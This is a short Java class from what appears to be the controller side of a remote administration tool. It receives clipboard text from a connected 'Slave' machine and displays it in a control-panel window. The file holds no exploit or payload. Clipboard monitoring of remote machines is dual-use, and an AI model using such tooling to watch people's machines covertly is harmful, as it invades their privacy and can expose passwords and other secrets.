package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlClipboard;

public class Packet41Clipboard extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String content = slave.readLine();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null) {
			PanelControlClipboard panel = (PanelControlClipboard) frame.panels.get("clipboard");
			panel.getPane().setText(content);
		}
	}

}
